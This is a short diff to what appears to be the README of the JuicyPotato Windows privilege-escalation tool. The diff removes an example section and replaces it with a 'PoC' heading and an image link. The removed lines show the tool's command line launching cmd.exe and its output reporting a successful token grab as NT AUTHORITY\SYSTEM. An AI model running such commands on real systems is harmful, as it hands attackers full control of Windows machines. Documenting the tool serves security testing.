@@ -74,18 +74,7 @@ Optional args:
 ```
 
 
-## Example
-
-```
-T:\>JuicyPotato.exe -t * -p c:\Windows\System32\cmd.exe -l 31337
-
-Testing {4991d34b-80a1-4291-83b6-3328366b9097} 31337
-......
-[+] authresult 0
-{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
-
-[+] CreateProcessWithTokenW OK
-```
+## PoC
 ![](assets/poc.png)
 
 ## Final thoughts
